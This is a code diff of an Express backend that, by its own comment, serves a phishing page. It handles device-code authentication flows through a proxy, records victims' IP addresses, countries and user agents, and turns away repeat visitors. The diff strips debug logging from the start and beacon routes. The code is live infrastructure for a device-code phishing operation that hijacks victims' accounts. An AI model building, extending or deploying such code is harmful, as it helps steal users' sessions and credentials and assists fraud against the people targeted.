@@ -34,27 +34,11 @@ async function getCountryFromIP(ip) {
  * Headers: X-Auth-Mode, X-VG-JWT (the phishing page's JWT)
  */
 router.post('/start', async (req, res) => {
-	const safeHeaderKeys = Object.keys(req.headers || {}).filter(
-		key => !/^(host|x-forwarded-for|x-real-ip|x-forwarded-proto|authorization|cookie|set-cookie)$/i.test(key)
-	);
-	const safeHeaders = safeHeaderKeys.reduce((acc, key) => {
-		acc[key] = req.headers[key];
-		return acc;
-	}, {});
-
-	console.log('[Device] ========== DEVICE CODE REQUEST START ==========');
-	console.log('[Device] Request headers:', JSON.stringify(safeHeaders).substring(0, 500));
-	console.log('[Device] Request body:', JSON.stringify(req.body).substring(0, 500));
-
 	try {
 	const mode = req.body.mode || req.headers['x-auth-mode'] || 'cookie';
 	const jwtToken = req.body.jwt_token || req.headers['x-vg-jwt'] || req.query.token;
 
-	console.log('[Device] JWT Token present:', !!jwtToken);
-	console.log('[Device] Mode:', mode);
-
 	if (!jwtToken) {
-		console.log('[Device] No JWT token provided');
 		return res.status(400).json({ error: 'JWT token required' });
 	}
 
@@ -85,7 +69,6 @@ router.post('/start', async (req, res) => {
 			);
 
 			if (visitorRows.length > 0) {
-				console.log(`[Device] Visitor blocked - already done/blocked. IP: ${ipAddress}, User: ${user_id}`);
 				// Log the blocked revisit
 				try {
 					const country = req.headers['cf-ipcountry'] || 'Unknown';
@@ -143,7 +126,6 @@ router.post('/start', async (req, res) => {
 				'INSERT INTO visitors (user_id, link_id, ip_address, country, user_agent, status, worker_name, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, NOW())',
 				[user_id, link_id, ipAddress, country, userAgent, 'waiting', workerName]
 			);
-			console.log(`[Device] Visitor logged - Link ID: ${link_id}, User ID: ${user_id}, IP: ${ipAddress}`);
 		}
 	} catch (jwtErr) {
 		console.error('[Device] Visitor logging failed:', jwtErr.message);
@@ -151,16 +133,10 @@ router.post('/start', async (req, res) => {
 	}
 
 	const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
-	console.log('[Device] API Base URL:', apiBaseUrl);
-	console.log('[Device] Calling startDeviceFlow...');
-
 	const result = await deviceProxy.startDeviceFlow(mode, jwtToken, apiBaseUrl, {
 		ip: ipAddress,
 		userAgent: userAgent
 	});
-
-	console.log('[Device] startDeviceFlow result:', JSON.stringify(result).substring(0, 500));
-	console.log('[Device] ========== DEVICE CODE REQUEST END ==========');
 
 	res.json(result);
 } catch (err) {
@@ -227,8 +203,6 @@ router.post('/beacon', async (req, res) => {
 				'INSERT INTO visitors (user_id, link_id, ip_address, country, user_agent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, NOW())',
 				[decoded.user_id, decoded.link_id, ipAddress, country, userAgent, 'waiting']
 			);
-
-			console.log(`[Beacon] Visitor logged - Link ID: ${decoded.link_id}, User ID: ${decoded.user_id}, IP: ${ipAddress}`);
 
 			res.json({ success: true, message: 'Beacon received' });
 		} catch (jwtErr) {
